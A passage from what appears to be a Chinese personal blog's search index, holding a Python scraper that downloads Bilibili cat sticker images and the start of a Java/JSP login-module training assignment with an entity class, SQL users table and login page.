class="punctuation">:</span> <span class="number">140</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/644bf254c17b733653425db528b3b39553599e1a.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-冲.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">822879</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/7be99b8651dd69cc0664bed583a3256f873e20cb.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-帅醒.png&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">867832</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">122</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/61dbe0163a0c545892f195d53d8ba001d394751e.png&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-JOJO承太&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">961783</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">121</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/451c9d93008bf50dd0005443c74e45dd72b71128.png&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-跳舞.gif&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">860578</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">121</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/d4072bef4bd47bedc6051916d93beb256f7c8c6a.gif&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-赫奇帕奇.j&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">942980</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">119</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/88ce5ab9891d8a42133c41bdab538e2414b31f2b.jpg&#x27;&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;名称&#x27;<span class="punctuation">:</span> &#x27;一猫人-拉文克劳.p&#x27;<span class="punctuation">,</span> &#x27;ID&#x27;<span class="punctuation">:</span> <span class="number">972899</span><span class="punctuation">,</span> &#x27;使用次数&#x27;<span class="punctuation">:</span> <span class="number">115</span><span class="punctuation">,</span> &#x27;URI&#x27;<span class="punctuation">:</span> &#x27;https<span class="punctuation">:</span><span class="comment">//i0.hdslb.com/bfs/material_up/92ed49143c4301c9e8e5af86b85458c0b6675ac5.png&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>好！没有问题！</p><p>浏览器中直接划到最下面，看看有<del>多深</del>多少页。</p><p>查看最后一张，一共有16页，最后一张是<code>火箭队.pn</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516223755327.png" alt="image-20220516223755327"></p><blockquote><p>看到这里肯定有人很奇怪，啊为什么是<code>火箭队.pn</code>不是<code>火箭队.png</code>？？</p><p>这就是另一个问题了，通过查看浏览器中其他数据可以看到表情包的格式有<code>.png .jpg .gif</code>，</p><p>但是！可能由于B站的API自身缘故在获得<code>title</code>这个元素的时候文件后缀有可能少一点，</p><p>于是出现了这种残缺后缀:</p><p><code>.j</code>,<code>.jp</code>,<code>.jpg</code>还有<code>.</code>和直接省略的!</p><p>为了保证获取的表情包具有可读性，文件名是一个重要的东西，所以就需要处理一下这个title了。</p></blockquote><p>处理文件名后缀的方法如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = title.replace(<span class="string">&#x27;一猫人-&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.pn&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.p&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.gif&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.gi&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.g&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.jp&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.j&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>大功告成，接下来就是爬取所有表情包了。</p><p>爬取所有页面<code>pn=0-16</code>（也许有第0页，不过没关系）的代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">     <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">pic_content = []</span><br><span class="line"><span class="keyword">for</span> pn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">     url = <span class="string">f&#x27;https://cool.bilibili.com/x/co-create/user/material_list?ps=15&amp;pn=<span class="subst">&#123;pn&#125;</span>&amp;mid=1445996044&amp;up_from=1&amp;biz_from=3&amp;material_type=7&amp;t=<span class="subst">&#123;time.time()&#125;</span>&#x27;</span></span><br><span class="line">     html = requests.get(url, headers=headers)</span><br><span class="line">     <span class="comment"># print(f&#x27;start=&#123;time.ctime()&#125;&#x27;)</span></span><br><span class="line">     <span class="comment"># time.sleep(2)</span></span><br><span class="line">     <span class="comment"># print(f&#x27;end=&#123;time.ctime()&#125;&#x27;)</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&#x27;uri = <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">          html_bytes = html.content</span><br><span class="line">          html_str = html_bytes.decode()</span><br><span class="line">     <span class="comment"># print(html_str)</span></span><br><span class="line">     data = json.loads(html_str)</span><br><span class="line">     all_items = data[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;material_list&#x27;</span>]</span><br><span class="line">     <span class="keyword">for</span> item <span class="keyword">in</span> all_items:</span><br><span class="line">          title = item[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">          material_id = item[<span class="string">&#x27;material_id&#x27;</span>]</span><br><span class="line">          uri = item[<span class="string">&#x27;cover&#x27;</span>]</span><br><span class="line">          used_count = item[<span class="string">&#x27;used_count&#x27;</span>]</span><br><span class="line">          pic_content.append(&#123;<span class="string">&#x27;名称&#x27;</span>: title, <span class="string">&#x27;ID&#x27;</span>: material_id, <span class="string">&#x27;使用次数&#x27;</span>: used_count, <span class="string">&#x27;URI&#x27;</span>: uri&#125;)</span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_content:</span><br><span class="line">     <span class="built_in">print</span>(pic)</span><br></pre></td></tr></table></figure><blockquote><p>最后通过<code>os</code>包操作下载到本地的当前目录的<code>source</code>文件夹。</p></blockquote><p>最终代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url: <span class="built_in">str</span>, dst_dir: <span class="built_in">str</span>, title: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dst_dir):</span><br><span class="line">        os.makedirs(dst_dir)</span><br><span class="line"></span><br><span class="line">    name = title.replace(<span class="string">&#x27;一猫人-&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.pn&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.p&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.gif&#x27;</span>,</span><br><span class="line">                                                                                                      <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.gi&#x27;</span>,</span><br><span class="line">                                                                                                                  <span class="string">&#x27;&#x27;</span>).replace(</span><br><span class="line">        <span class="string">&#x27;.g&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.jp&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.j&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    filename = url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.png&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        filename = name + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.gif&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        filename = name + <span class="string">&quot;.gif&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.jpg&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        filename = name + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    file_path = os.path.join(dst_dir, filename)</span><br><span class="line">    r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;saving to&quot;</span>, os.path.abspath(file_path))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span> * <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> chunk:</span><br><span class="line">                f.write(chunk)</span><br><span class="line">                f.flush()</span><br><span class="line">                os.fsync(f.fileno())</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># HTTP status code 4XX/5XX</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Download failed: status code &#123;&#125;\n&#123;&#125;&quot;</span>.<span class="built_in">format</span>(r.status_code, r.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url_list = []</span><br><span class="line">pic_content = []</span><br><span class="line"><span class="keyword">for</span> pn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">17</span>):</span><br><span class="line">    url = <span class="string">f&#x27;https://cool.bilibili.com/x/co-create/user/material_list?ps=15&amp;pn=<span class="subst">&#123;pn&#125;</span>&amp;mid=1445996044&amp;up_from=1&amp;biz_from=3&amp;material_type=7&amp;t=<span class="subst">&#123;time.time()&#125;</span>&#x27;</span></span><br><span class="line">    html = requests.get(url, headers=headers)</span><br><span class="line">    <span class="comment"># print(f&#x27;start=&#123;time.ctime()&#125;&#x27;)</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    <span class="comment"># print(f&#x27;end=&#123;time.ctime()&#125;&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;uri = <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        html_bytes = html.content</span><br><span class="line">        html_str = html_bytes.decode()</span><br><span class="line">    <span class="comment"># print(html_str)</span></span><br><span class="line">    data = json.loads(html_str)</span><br><span class="line">    all_items = data[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;material_list&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> all_items:</span><br><span class="line">        title = item[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        material_id = item[<span class="string">&#x27;material_id&#x27;</span>]</span><br><span class="line">        uri = item[<span class="string">&#x27;cover&#x27;</span>]</span><br><span class="line">        used_count = item[<span class="string">&#x27;used_count&#x27;</span>]</span><br><span class="line">        pic_content.append(&#123;<span class="string">&#x27;名称&#x27;</span>: title, <span class="string">&#x27;ID&#x27;</span>: material_id, <span class="string">&#x27;使用次数&#x27;</span>: used_count, <span class="string">&#x27;URI&#x27;</span>: uri&#125;)</span><br><span class="line">        url_list.append(uri)</span><br><span class="line">        download(uri, dst_dir=<span class="string">&quot;source&quot;</span>, title=title)</span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_content:</span><br><span class="line">    <span class="built_in">print</span>(pic)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终效果截图: </p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516233421550.png" alt="image-20220516233421550"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220516233544162.png" alt="image-20220516233544162"></p><blockquote><p>一共227张猫人表情！又可以狠狠的水群了！🥰</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/%E5%B8%A6%E8%96%AA%E7%BE%A4%E8%81%8A.png" alt="带薪群聊"></p><blockquote><p>下载的表情包</p><ul><li><p>我自己的云： <a target="_blank" rel="noopener" href="http://cloud.q1jun.cn/s/8GuV">http://cloud.q1jun.cn/s/8GuV</a> （可预览</p></li><li><p>百度云: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1gPQPjmaAEQodEBGYP_lYvQ">https://pan.baidu.com/s/1gPQPjmaAEQodEBGYP_lYvQ</a> 提取码: tnoi</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web </tag>
            
            <tag> bs4 </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0512实训作业</title>
      <link href="/2022/05/12/a01aa4c60e18-q1jun/"/>
      <url>/2022/05/12/a01aa4c60e18-q1jun/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-登入模块代码实现"><a href="#0x01-登入模块代码实现" class="headerlink" title="0x01 登入模块代码实现"></a>0x01 登入模块代码实现</h3><ol><li>创建User实体类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ruanko.newspublish.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Users</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> uid;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Users</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Users</span><span class="params">(<span class="type">int</span> uid, String username, String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uid = uid;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUid</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUid</span><span class="params">(<span class="type">int</span> uid)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uid = uid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Users&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;uid=&quot;</span> + uid +</span><br><span class="line">                <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>创建存放User数据的数据库table</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `users`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `users` (</span><br><span class="line">  `uid` <span class="type">int</span> unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`uid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">2</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_0900_ai_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建login.jsp文件</li></ol><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: q1jun</span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">5</span>/<span class="number">11</span></span><br><span class="line">  Time: <span class="number">17</span>:<span class="number">19</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> request.getScheme()+<span class="string">&quot;://&quot;</span>+request.getServerName()+<span class="string">&quot;:&quot;</span>+request.getServerPort()+path+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath%&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登入&lt;/title&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/weui.min.js&quot;</span> language=<span class="string">&quot;JavaScript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;css/weui.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body data-weui-theme=<span class="string">&quot;light&quot;</span>&gt;</span><br><span class="line">&lt;form class=<span class="string">&quot;weui-cells&quot;</span> action=<span class="string">&quot;login&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;js_input1&quot;</span> class=<span class="string">&quot;weui-cell weui-cell_active&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;weui-cell__hd&quot;</span>&gt;&lt;span class=<span class="string">&quot;weui-label&quot;</span>&gt;用户名&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;weui-cell__bd&quot;</span>&gt;</span><br><span class="line">            &lt;input name=<span class="string">&quot;username&quot;</span> id=<span class="string">&quot;js_input1&quot;</span> class=<span class="string">&quot;weui-input&quot;</span> placeholder=<span class="string">&quot;填写用户名&quot;</span>&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;js_input2&quot;</span> class=<span class="string">&quot;weui-cell weui-cell_active&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;weui-cell__hd&quot;</span>&gt;&lt;span class=<span class="string">&quot;weui-label&quot;</span>&gt;密码&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;weui-cell__bd&quot;</span>&gt;</span><br><span class="line">            &lt;input name=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;js_input2&quot;</span> type=<span class="string">&quot;password&quot;</span> class=<span class="string">&quot;weui-input&quot;</span> placeholder=<span class="string">&quot;填写密码&quot;</span>&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;p style=<span class="string">&quot;color: red&quot;</span>&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">            <span class="keyword">if</span>(request.getAttribute(<span class="string">&quot;message&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">                out.println(request.getAttribute(<span class="string">&quot;message&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        %&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;input role=<span 